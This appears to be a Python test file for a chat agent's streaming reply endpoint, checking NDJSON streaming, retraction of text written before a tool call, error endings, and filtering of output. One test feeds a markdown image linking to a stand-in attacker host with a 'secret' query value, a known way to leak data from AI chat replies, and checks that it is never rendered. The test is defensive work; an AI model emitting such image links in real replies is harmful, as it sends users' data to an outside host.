"""
The reply as it is written, for a browser that asks for it. It may show nothing the finished
reply would not.
"""
import json

from conftest import ScriptedModel, calls, reply
from pydantic_ai.messages import ModelResponse, TextPart, ToolCallPart

STREAM = {"Accept": "application/x-ndjson, application/json"}


def lines(response):
    assert response.headers["content-type"].startswith("application/x-ndjson")
    return [json.loads(line) for line in response.text.splitlines() if line.strip()]


def test_a_browser_that_does_not_ask_gets_the_answer_in_one_piece(make_client):
    client = make_client(ScriptedModel(reply("Hello.")))

    response = client.post("/message", json={"input": "hi"})

    assert response.headers["content-type"].startswith("application/json")
    assert response.json()["output_text"] == "Hello."


def test_the_reply_arrives_as_it_is_written_and_then_whole(make_client):
    text = "SEAD holds environmental archaeology data from thousands of sites."
    client = make_client(ScriptedModel(reply(text)))

    events = lines(client.post("/message", json={"input": "What is SEAD?"}, headers=STREAM))

    shown = [event["text"] for event in events if event.get("type") == "text"]
    assert shown, "nothing was streamed"
    assert all(text.startswith(part) for part in shown)
    assert events[-1]["status"] == "complete"
    assert events[-1]["output_text"] == text


def test_text_written_before_a_tool_call_is_taken_back(make_client):
    step = ModelResponse(parts=[TextPart("Let me look that up for you."), ToolCallPart("get_state", {}, tool_call_id="c1")])
    client = make_client(ScriptedModel(step))

    events = lines(client.post("/message", json={"input": "What is open?"}, headers=STREAM))

    shown = [event["text"] for event in events if event.get("type") == "text"]
    assert shown[0] and "Let me look that up for you.".startswith(shown[0])
    assert shown[-1] == ""
    assert events[-1]["status"] == "action_required"
    assert events[-1]["action"]["command"] == "get_state"


def test_the_leg_after_an_action_streams_too(make_client):
    client = make_client(ScriptedModel(calls(("get_state", {}, "c1")), reply("You have no filters open.")))

    first = client.post("/message", json={"input": "What is open?"}, headers=STREAM)
    action = lines(first)[-1]
    events = lines(client.post("/message/action-result", json={"turnId": action["turnId"], "actionId": action["action"]["id"], "result": {}}, headers=STREAM))

    assert events[-1]["output_text"] == "You have no filters open."


def test_an_image_is_never_streamed(make_client):
    text = "Here is the chart ![chart](https://evil.example/p.png?q=secret) and more text after it."
    client = make_client(ScriptedModel(reply(text)))

    events = lines(client.post("/message", json={"input": "hi"}, headers=STREAM))

    #Not in any line - the half-written image renders as text, never as an image
    assert "![chart](https://evil.example" not in json.dumps(events)
    assert all("![" not in event.get("text", "") or ")" not in event["text"].split("![", 1)[1] for event in events if event.get("type") == "text")
    assert events[-1]["output_text"] == "Here is the chart chart and more text after it."


def test_tool_call_markup_is_never_streamed(make_client):
    markup = "<tool_call><function=get_state></function></tool_call>"
    client = make_client(ScriptedModel(reply(markup), reply("Nothing is open.")))

    events = lines(client.post("/message", json={"input": "hi"}, headers=STREAM))

    assert "tool_call" not in json.dumps([event for event in events if event.get("type") == "text"])
    assert events[-1]["output_text"] == "Nothing is open."


def test_a_failed_turn_ends_the_stream_with_its_error(make_client):
    def broken(messages):
        raise RuntimeError("model server fell over")
    client = make_client(ScriptedModel(broken))

    events = lines(client.post("/message", json={"input": "hi"}, headers=STREAM))

    assert events[-1] == {"status": "error", "httpStatus": 502, "error": "The SEAD agent could not be reached."}


def test_requests_refused_before_a_turn_starts_keep_their_status(make_client):
    client = make_client(ScriptedModel())

    response = client.post("/message", json={"input": ""}, headers=STREAM)

    assert response.status_code == 400
    assert response.headers["content-type"].startswith("application/json")
